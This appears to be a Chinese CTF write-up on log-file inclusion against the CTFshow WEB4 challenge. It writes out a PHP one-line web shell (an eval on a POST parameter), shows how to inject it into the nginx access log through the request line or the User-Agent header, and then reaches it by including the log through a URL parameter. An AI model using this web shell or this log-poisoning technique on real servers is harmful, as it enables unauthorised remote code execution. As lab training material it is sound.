---
title: 日志文件包含
date: 2020-07-04  20:02:54
categories: web
---



测试靶机：CTFshow WEB4

<!--more-->

## 漏洞测试

1.输入<?php phpinfo();?>进行测试

2.查看相应日志文件，在本题中文件日志默认地址为`/var/log/nginx/access.log`
 （可通过抓包查看得知服务器为Ubuntu，由nginx搭建的网站，nginx的日志文件默认地址在/var/log/nginx/access.log和/var/log/nginx/error.log，其中本题中access.log可以打开）

 ![](http://img.npfs06.top/20210226200525.jpeg?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

![](http://img.npfs06.top/20210226200537.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)





`?url=/var/log/nginx/access.log`,查看文件日志，发现刚刚get的phpinfo存在日志里,且被转义



![](http://img.npfs06.top/20210226200550.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



3.重新Get <?php phpinfo();?> 并进行抓包

![](http://img.npfs06.top/20210226200609.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

将这里的`%3C?php%20phpinfo();?%3E`改成` <?php phpinfo();?> `
修改之后放包，再去文件包含日志文件，发现<?php phpinfo();?>已被执行

4.由此判断存在日志注入漏洞



## 法一

1.输入一句话木马`<?php @eval($_POST[npfs]);?>`

![](http://img.npfs06.top/20210226200625.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

2.抓包将转义后的`<?php @eval($_POST[npfs]);?>`修改回来，放包（实际做法，如上面所述）

3.访问日志文件，查看存在一句话木马内容，说明一句话木马被当作php语言正常解析

4.蚁剑连接

![](http://img.npfs06.top/20210226200638.jpeg?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

flag在根目录下的www的flag.txt文件中



## 法二

1.url :`?url=/var/log/nginx/access.log`,抓包

2.利用 user-agent 插入 payload 到日志文件

![](http://img.npfs06.top/20210226200655.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)



3. 放包，蚁剑连接
    ![](http://img.npfs06.top/20210226200708.jpeg?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

flag在根目录下的www的flag.txt文件中